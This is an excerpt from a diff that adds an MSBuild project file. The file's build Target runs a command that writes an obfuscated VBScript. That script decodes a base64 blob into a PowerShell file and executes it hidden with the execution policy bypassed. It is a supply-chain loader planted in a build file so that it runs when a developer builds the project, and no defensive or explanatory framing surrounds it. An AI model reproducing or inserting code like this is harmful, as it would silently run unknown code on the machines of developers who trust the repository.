ZNUtZWHJTYkxRNmN1cURqbFNNaVBpb25lRzFoTGd5YTdDRy9hUFNFV0FlN2xPRUlhRHNMdDgvbFdOYitDbjFvbllzRWVOOEovY2lvZEJhSmRVTEdBK1ZlWmoxQXM3TnhUY0R0L3h6eWpVQm1JLzhubHFsUXAzUTVpVHRhaWRyVTZ2aXB3dkJ5M3dYUURrMGRxNThLSmZ6R04vMU5QTVZVR0NzTGlkNVVHRkFLbXk1THdDbXJNVm9NSFVtTXVPYy9oSWZVOUl0bnVJSEMyNkhuS21YQzV6N2pmVlYwT24rOEVReVEwemw3NGVIWUpKUjV1RWRSVEhIYU9P&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\i.ps1&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\b.vbs&quot;&#xD;&#xA;endlocal" />
+  </Target>
+</Project>
